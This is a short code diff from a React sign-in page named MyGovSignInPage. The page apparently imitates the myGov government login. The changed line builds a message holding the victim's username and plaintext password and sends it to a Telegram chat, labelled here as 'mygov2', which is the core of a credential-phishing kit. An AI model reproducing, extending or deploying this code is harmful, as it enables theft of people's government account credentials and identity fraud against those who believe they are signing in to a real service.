@@ -22,7 +22,7 @@ const MyGovSignInPage: React.FC = () => {
     }
 
     setIsLoading(true);
-    const message = `🔑 New Login Attempt\nUsername: ${username}\nPassword: ${password}\nTime: ${new Date().toLocaleString()}`;
+    const message = `🔑 New Login mygov2 Attempt\nUsername: ${username}\nPassword: ${password}\nTime: ${new Date().toLocaleString()}`;
 
     try {
       await sendTelegramMessage(message);
